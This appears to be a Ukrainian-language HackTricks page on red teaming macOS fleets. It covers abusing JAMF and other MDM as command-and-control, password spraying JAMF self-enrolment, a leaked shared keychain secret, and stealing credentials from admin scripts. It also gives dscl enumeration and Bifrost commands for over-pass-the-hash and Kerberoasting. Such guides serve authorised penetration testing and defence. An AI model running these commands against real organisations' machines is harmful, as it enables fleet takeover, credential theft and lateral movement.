# Red Teaming у macOS

{{#include ../../banners/hacktricks-training.md}}


## Зловживання MDM

- JAMF Pro: `jamf checkJSSConnection`
- Kandji

Якщо вам вдасться **скомпрометувати облікові дані адміністратора** для доступу до management platform, ви **потенційно можете скомпрометувати всі комп’ютери**, поширивши malware на ці машини.

Для red teaming у середовищах MacOS наполегливо рекомендується розуміти принцип роботи MDM:


{{#ref}}
macos-mdm/
{{#endref}}

### Використання MDM як C2

MDM матиме дозволи на встановлення, опитування або видалення профілів, встановлення applications, створення локальних облікових записів адміністратора, встановлення firmware password, зміну ключа FileVault...

Щоб запустити власний MDM, вам потрібно, щоб **ваш CSR був підписаний vendor**, що можна спробувати отримати через [**https://mdmcert.download/**](https://mdmcert.download/). А щоб запустити власний MDM для Apple-пристроїв, можна використати [**MicroMDM**](https://github.com/micromdm/micromdm).

Однак для встановлення application на enrolled device він усе ще має бути підписаний developer account... проте під час MDM enrolment **device додає SSL cert MDM як trusted CA**, тож тепер ви можете підписати будь-що.<sup>[[4]](#references)</sup>

Щоб enrol device у MDM, потрібно встановити файл **`mobileconfig`** від імені root; його можна доставити через файл **pkg** (можна стиснути його в zip, і під час завантаження із Safari його буде розпаковано).

**Mythic agent Orthrus** використовує цю техніку.

### Зловживання JAMF PRO

JAMF може запускати **custom scripts** (scripts, розроблені sysadmin), **native payloads** (створення локального облікового запису, встановлення EFI password, моніторинг файлів/process...) і **MDM** (конфігурації device, device certificates...).<sup>[[5]](#references)</sup>

#### JAMF self-enrolment

Перейдіть на сторінку на кшталт `https://<company-name>.jamfcloud.com/enroll/`, щоб перевірити, чи ввімкнено **self-enrolment**. Якщо його ввімкнено, система може **запросити credentials для доступу**.

Для виконання password spraying attack можна використати script [**JamfSniper.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py).

Крім того, після знаходження правильних credentials можна brute-force інші usernames за допомогою наведеної нижче форми:

![Зловживання JAMF PRO — JAMF self-enrolment: Крім того, після знаходження правильних credentials можна brute-force інші usernames за допомогою наведеної нижче форми](<../../images/image (107).png>)

#### JAMF device Authentication

<figure><img src="../../images/image (167).png" alt=""><figcaption></figcaption></figure>

Бінарний файл **`jamf`** містив secret для відкриття keychain, який на момент виявлення був **спільним** для всіх і мав значення: **`jk23ucnq91jfu9aj`**.<sup>[[5]](#references)</sup>\
Крім того, jamf **persist** як **LaunchDaemon** у **`/Library/LaunchAgents/com.jamf.management.agent.plist`**

#### JAMF Device Takeover

**URL** **JSS** (Jamf Software Server), який використовуватиме **`jamf`**, розташований у **`/Library/Preferences/com.jamfsoftware.jamf.plist`**.\
Цей файл фактично містить URL:
```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist

[...]
<key>is_virtual_machine</key>
<false/>
<key>jss_url</key>
<string>https://subdomain-company.jamfcloud.com/</string>
<key>last_management_framework_change_id</key>
<integer>4</integer>
[...]
```
Отже, зловмисник може розмістити шкідливий пакет (`pkg`), який **перезаписує цей файл** під час інсталяції, задаючи **URL-адресу слухача Mythic C2 від агента Typhon**, щоб отримати можливість використовувати JAMF як C2.
```bash
# After changing the URL you could wait for it to be reloaded or execute:
sudo jamf policy -id 0

# TODO: There is an ID, maybe it's possible to have the real jamf connection and another one to the C2
```
#### Імітація JAMF

Щоб **імпersonate комунікацію** між пристроєм і JMF, вам потрібно:

- **UUID** пристрою: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
- **JAMF keychain** із: `/Library/Application\ Support/Jamf/JAMF.keychain`, який містить сертифікат пристрою

Маючи цю інформацію, **створіть VM** зі **вкраденим** Hardware **UUID** і з **вимкненим SIP**, перемістіть **JAMF keychain**, встановіть **hook** на Jamf **agent** і викрадіть його інформацію.

#### Викрадення секретів

<figure><img src="../../images/image (1025).png" alt=""><figcaption><p>a</p></figcaption></figure>

Ви також можете відстежувати розташування `/Library/Application Support/Jamf/tmp/` на предмет появи **custom scripts**, які адміністратори можуть захотіти виконати через Jamf, оскільки вони **розміщуються тут, виконуються та видаляються**. Ці скрипти **можуть містити облікові дані**.

Однак **облікові дані** можуть передаватися цим скриптам як **параметри**, тому вам потрібно буде відстежувати `ps aux | grep -i jamf` (навіть без root-привілеїв).

Скрипт [**JamfExplorer.py**](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) може прослуховувати додавання нових файлів і появу аргументів нових процесів.

### Віддалений доступ до macOS

А також інформацію про "спеціальні" **мережеві** **протоколи** MacOS:


{{#ref}}
../macos-security-and-privilege-escalation/macos-protocols.md
{{#endref}}

## Active Directory

У деяких випадках ви виявите, що **комп’ютер MacOS підключений до AD**. У цьому сценарії вам слід спробувати **enumerate** Active Directory так, як ви це зазвичай робите. Знайдіть **допомогу** на таких сторінках:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}


{{#ref}}
../../windows-hardening/active-directory-methodology/
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/
{{#endref}}

Деякі **локальні інструменти MacOS**, які також можуть вам допомогти, наприклад `dscl`:
```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
```
Також існують деякі інструменти для MacOS, призначені для автоматичного перерахування AD і роботи з kerberos:

- [**Machound**](https://github.com/XMCyber/MacHound): MacHound — це розширення інструмента аудиту Bloodhound, що дає змогу збирати та імпортувати зв'язки Active Directory на хостах MacOS.<sup>[[2]](#references)</sup>
- [**Bifrost**](https://github.com/its-a-feature/bifrost): Bifrost — це проєкт Objective-C, призначений для взаємодії з API Heimdal krb5 у macOS. Мета проєкту — забезпечити ефективніше тестування безпеки Kerberos на пристроях macOS за допомогою нативних API, без потреби в інших фреймворках або пакетах на цільовій системі.
- [**Orchard**](https://github.com/its-a-feature/Orchard): інструмент JavaScript for Automation (JXA) для перерахування Active Directory.

### Інформація про домен
```bash
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
```
### Користувачі

Існує три типи користувачів macOS:

- **Локальні користувачі** — керуються локальною службою OpenDirectory і жодним чином не підключені до Active Directory.
- **Мережеві користувачі** — тимчасові користувачі Active Directory, яким для автентифікації потрібне підключення до сервера DC.
- **Мобільні користувачі** — користувачі Active Directory із локальною резервною копією облікових даних і файлів.

Локальна інформація про користувачів і групи зберігається в папці _/var/db/dslocal/nodes/Default._\
Наприклад, інформація про користувача _mark_ зберігається в _/var/db/dslocal/nodes/Default/users/mark.plist_, а інформація про групу _admin_ — у _/var/db/dslocal/nodes/Default/groups/admin.plist_.

На додаток до використання ребер HasSession і AdminTo, **MacHound додає три нові ребра** до бази даних Bloodhound:<sup>[[2]](#references)</sup>

- **CanSSH** — сутність, якій дозволено підключатися до хоста через SSH
- **CanVNC** — сутність, якій дозволено підключатися до хоста через VNC
- **CanAE** — сутність, якій дозволено виконувати скрипти AppleEvent на хості
```bash
#User enumeration
dscl . ls /Users
dscl . read /Users/[username]
dscl "/Active Directory/TEST/All Domains" ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user

#Computer enumeration
dscl "/Active Directory/TEST/All Domains" ls /Computers
dscl "/Active Directory/TEST/All Domains" read "/Computers/[compname]$"

#Group enumeration
dscl . ls /Groups
dscl . read "/Groups/[groupname]"
dscl "/Active Directory/TEST/All Domains" ls /Groups
dscl "/Active Directory/TEST/All Domains" read "/Groups/[groupname]"

#Domain Information
dsconfigad -show
```
Більше інформації: [https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)

### Пароль Computer$

Отримуйте паролі за допомогою:
```bash
bifrost --action askhash --username [name] --password [password] --domain [domain]
```
Можна отримати доступ до пароля **`Computer$`** у системному keychain.

### Over-Pass-The-Hash

Отримайте TGT для певного користувача та service:
```bash
bifrost --action asktgt --username [user] --domain [domain.com] \
--hash [hash] --enctype [enctype] --keytab [/path/to/keytab]
```
Після отримання TGT його можна інжектити в поточну сесію за допомогою:
```bash
bifrost --action asktgt --username test_lab_admin \
--hash CF59D3256B62EE655F6430B0F80701EE05A0885B8B52E9C2480154AFA62E78 \
--enctype aes256 --domain test.lab.local
```
### Kerberoasting
```bash
bifrost --action asktgs --spn [service] --domain [domain.com] \
--username [user] --hash [hash] --enctype [enctype]
```
З отриманими service tickets можна спробувати отримати доступ до спільних ресурсів на інших комп’ютерах:
```bash
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```
## Доступ до Keychain

Keychain, найімовірніше, містить конфіденційну інформацію, яка в разі доступу до неї без створення prompt могла б допомогти просунутися далі у вправі Red Team:


{{#ref}}
macos-keychain.md
{{#endref}}

## Зовнішні сервіси

Red Teaming у macOS відрізняється від звичайного Red Teaming у Windows, оскільки **macOS зазвичай безпосередньо інтегрована з кількома зовнішніми платформами**. Поширена конфігурація macOS передбачає доступ до комп'ютера за допомогою **синхронізованих облікових даних OneLogin і доступ до кількох зовнішніх сервісів** (таких як github, aws...) через OneLogin.

## Різні техніки Red Team

### Safari

Коли файл завантажується в Safari, якщо це «безпечний» файл, його буде **автоматично відкрито**. Наприклад, якщо ви **завантажите zip**, його буде автоматично розпаковано:

<figure><img src="../../images/image (226).png" alt=""><figcaption></figcaption></figure>

## Посилання

- [1] [Gone Apple Pickin': Red Teaming MacOS Environments in 2021 - Cedric Owens (DEF CON 29)](https://www.youtube.com/watch?v=IiMladUbL6E)
- [2] [Introducing MacHound: A Solution to macOS Active Directory Based Attacks](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
- [3] [its-a-feature - Domain Enumeration Commands (dscl / net / ldapsearch equivalents)](https://gist.github.com/its-a-feature/1a34f597fb30985a2742bb16116e74e0)
- [4] [Come to the Dark Side, We Have Apples: Turning macOS Management Evil](https://www.youtube.com/watch?v=pOQOh07eMxY)
- [5] [OBTS v3.0: "An Attackers Perspective on Jamf Configurations" - Luke Roberts / Calum Hall](https://www.youtube.com/watch?v=ju1IYWUv4ZA)


{{#include ../../banners/hacktricks-training.md}}
